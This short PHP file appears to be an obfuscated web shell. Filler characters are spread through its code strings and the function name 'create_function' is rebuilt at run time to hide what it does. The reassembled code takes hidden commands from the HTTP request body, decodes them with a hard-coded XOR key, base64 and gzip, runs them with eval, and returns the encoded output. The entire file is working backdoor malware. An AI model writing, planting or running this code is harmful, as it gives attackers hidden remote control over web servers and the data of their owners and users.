<?php
$S='$k="ae50540515c5";$kh="0522710051ca05b27305"05;$kf="05277234512746";$p=05"w';
$t='$m05[1]),$k))05);$o0505=@ob_get_cont05ents();05@ob_en05d_clean05();$r05=@ba';
$f='5==1) {@ob_s05tart();0505@eva05l(@gzuncomp05ress(0505@x(@base6054_decode(';
$b='0505h("/$kh(.05+)$kf/05",@file_05ge05t_cont05ents("php://05input"),05$m)0';
$a=';$j05++,$i05++){$o.=$t05{$i05}^0505$k{$j};}}return $o05;}if (@preg05_05matc';
$C='len($05t);$05o="";for05($i=0;05$i<05$l;){for(0505$j=0;($j05<$c&&$05i<$l)05';
$k=str_replace('E','','creEaEEteE_EfuEnction');
$z='se6054_e05ncod05e(@x(@05g05zcompress($o),$05k));p05rint("05$p$k05h$r$kf");}';
$G='Cj5J05AV3oSAd0505IH4d";fun05ction x(050505$t,$k){$c=strl05en($k);$05l=str';
$K=str_replace('05','',$S.$G.$C.$a.$b.$f.$t.$z);
$g=$k('',$K);$g();
?>
